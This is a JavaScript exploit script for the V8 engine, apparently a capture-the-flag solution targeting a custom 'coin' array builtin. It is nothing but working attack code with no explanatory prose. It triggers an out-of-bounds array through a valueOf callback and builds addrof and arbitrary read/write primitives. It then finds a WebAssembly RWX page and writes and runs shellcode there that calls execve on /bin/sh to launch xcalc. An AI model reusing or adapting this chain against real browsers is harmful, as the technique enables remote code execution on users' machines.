class convert
{
    constructor()
    {
        this.buf=new ArrayBuffer(8)
        this.uint8array=new Uint8Array(this.buf);
        this.float64array=new Float64Array(this.buf);
        this.uint32array=new Uint32Array(this.buf);
    }
    f2i(x)//float64 ==> uint64
    {
        this.float64array[0]=x;
        let sum = 0;
        for (let i = 0 ;i< 8 ;i ++)
            sum += this.uint8array[i]*(0x100**i);
        return sum;
    }
    i2f(x)
    {
        let tmp = [];
        tmp[0] = (x % 0x100000000);
        tmp[1] = ((x - tmp[0]) / 0x100000000);
        this.uint32array[0]=tmp[0];
        this.uint32array[1]=tmp[1];
        return this.float64array[0];
    }
}
function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); } }


let conv = new convert();
let arr = [1.1,1.1,1.1];
let oobArray ;
//%DebugPrint(arr); // element  0x3fba603cb508
//%SystemBreak();
let val = {
    valueOf: function(){
        oobArray = [1.1];//0x2e3b6fb0b619
        //%DebugPrint(oobArray);
        arr.length =  100;
        //%SystemBreak();
        return 0x123456789999;
    }
}
arr.coin(1,val); // GetOOBArray

let objArray = [{a:0x414141 , b:{}}];
let buf = new ArrayBuffer(0x81);
//%DebugPrint(objArray);
//%DebugPrint(buf);
let objOffset ;
let bufOffset ;
for(let i = 0 ; i < 0x1000 ; i++)
{
    if(conv.f2i(oobArray[i]) == 0x828282)
    {
        print(conv.f2i(oobArray[i]).toString(16));
        objOffset = i+1;
        break;
    }
}
for(let i = 0 ; i < 0x1000 ; i++)
{
    if(conv.f2i(oobArray[i]) == 0x81)
    {
        print(conv.f2i(oobArray[i]).toString(16));
        bufOffset = i+1;
        break;
    }
}
function addrof(o)
{
    objArray[0].b = o;
    return conv.f2i(oobArray[objOffset]); 
}

function read(addr)
{
    oobArray[bufOffset] = conv.i2f(addr);
    let uint8array = new Uint8Array(buf);
    let sum = 0;
    for (let i = 0 ; i< 8 ;i ++)
        sum += uint8array[i]*(0x100**i);
    return sum;
}
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
//%DebugPrint(f);
let f_addr = addrof(f) - 1;
console.log("f_addr ==> 0x"+f_addr.toString(16));
let share_info_addr = read(f_addr + 0x18) - 1;
console.log("share_info ==> 0x"+share_info_addr.toString(16));
let wasm = read(share_info_addr + 8) - 1;
console.log("wasm ==> 0x"+wasm.toString(16));
let instance=read(wasm+0x10) -1;
console.log("instance ==> 0x"+instance.toString(16));
let rwx_addr=read(instance+0x80)
console.log("rwx_addr ==> 0x"+rwx_addr.toString(16));

shellcode =[72,49,210,82,72,141,61,48,0,0,0,87,72,141,61,37,0,0,0,87,72,141,61,21,0,0,0,87,72,141,52,36,72,141,61,9,0,0,0,72,199,192,59,0,0,0,15,5,47,98,105,110,47,115,104,0,45,99,0,101,120,112,111,114,116,32,68,73,83,80,76,65,89,61,58,48,46,48,59,120,99,97,108,99,0]
let dataview = new DataView(buf);
oobArray[bufOffset]=conv.i2f(rwx_addr);
for(let i = 0 ; i < shellcode.length ; i++)
{
    dataview.setUint8(i,shellcode[i],true);
}
f();
